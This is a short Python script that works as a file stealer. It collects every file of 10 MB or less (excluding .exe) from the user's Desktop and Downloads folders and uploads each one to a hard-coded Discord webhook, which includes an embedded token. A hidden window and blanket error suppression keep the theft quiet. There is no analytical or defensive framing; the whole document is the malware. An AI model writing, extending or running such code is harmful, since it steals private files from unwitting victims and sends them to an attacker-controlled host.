import os
import requests
import tkinter as tk 

webhook_url = 'https://discord.com/api/webhooks/1289453262231306294/2mvDt8pJ2IgFGGTSuPX461D1sioknPfj7P5di4hxmIxD95IZZRWqN4v7K9q13H2NcQXj'
max_file_size = 10 * 1024 * 1024  # 10 MB
desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
downloads_path = os.path.join(os.environ['USERPROFILE'], 'Downloads')

def get_files(directory):
    return [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f)) and not f.endswith('.exe') and os.path.getsize(os.path.join(directory, f)) <= max_file_size]

def send_files(files):
    for file_path in files:
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
                filename = os.path.basename(file_path)
                response = requests.post(webhook_url, files={'file': (filename, file_data)})
        except Exception:
            pass

if __name__ == "__main__":
    # Create a hidden Tkinter window
    root = tk.Tk()
    root.withdraw() 

    desktop_files = get_files(desktop_path)
    downloads_files = get_files(downloads_path)
    all_files = desktop_files + downloads_files
    txt_files = [f for f in all_files if f.endswith('.txt')]
    other_files = [f for f in all_files if not f.endswith('.txt')]

    if txt_files:
        send_files(txt_files)
    if other_files:
        send_files(other_files)
